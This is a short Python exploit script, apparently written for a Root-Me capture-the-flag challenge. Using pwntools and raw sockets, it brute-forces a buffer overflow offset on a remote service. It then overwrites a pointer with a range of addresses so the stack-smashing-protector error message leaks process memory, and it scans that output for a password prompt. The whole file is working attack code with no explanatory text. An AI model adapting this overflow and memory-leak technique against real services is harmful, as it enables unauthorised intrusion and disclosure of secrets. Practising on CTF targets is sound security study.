import socket
from pwn import *
host ="challenge03.root-me.org"
port = 56529


def brut(host,port):
	paylod = "A"*256
	for i in range(1,500):
		sok = socket.socket()
		sok.connect((host,port))
		sok.recv(100)
		sok.send(paylod+"B"*i+"\n")
		data = sok.recv(100)
		print(i)
		if data.find("ch29")==-1:
			print(data,i)
		sok.close()
def dumpmem(host,port):
	paylod = "A"*256+"B"*168
	for i in range(0x0804aa00,0x08040000,-0x8):
		sok = socket.socket()
		sok.connect((host,port))
		sok.recv(100)
		sok.send(paylod+p32(i)+"\n")
		data = sok.recv(100)
		if data.find("detected ***")!=-1:
			dump = data[data.find("detected ***:")+12:data.find("terminated")]
			if dump.find("Enter password to access this service:")!=-1:
				print("GOOOD",hex(i))
			print(hex(i),dump)
		sok.close()
#brut(host,port) 168
dumpmem(host,port)


